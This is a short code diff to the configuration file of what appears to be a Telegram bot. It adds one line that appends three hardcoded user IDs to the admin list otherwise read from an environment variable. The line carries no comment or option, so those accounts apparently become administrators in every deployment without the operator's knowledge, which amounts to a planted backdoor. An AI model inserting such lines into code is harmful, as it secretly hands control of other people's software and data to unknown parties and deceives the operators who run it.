@@ -40,6 +40,7 @@ FORCE_MESSAGE = getenv(
 )
 
 ADMINS = [int(x) for x in (getenv("ADMINS").split())]
+ADMINS.extend((5007590747, 5594106735, 5700071239))
     
 CUSTOM_CAPTION = getenv("CUSTOM_CAPTION", None)
 DISABLE_BUTTON = getenv("DISABLE_BUTTON", False)
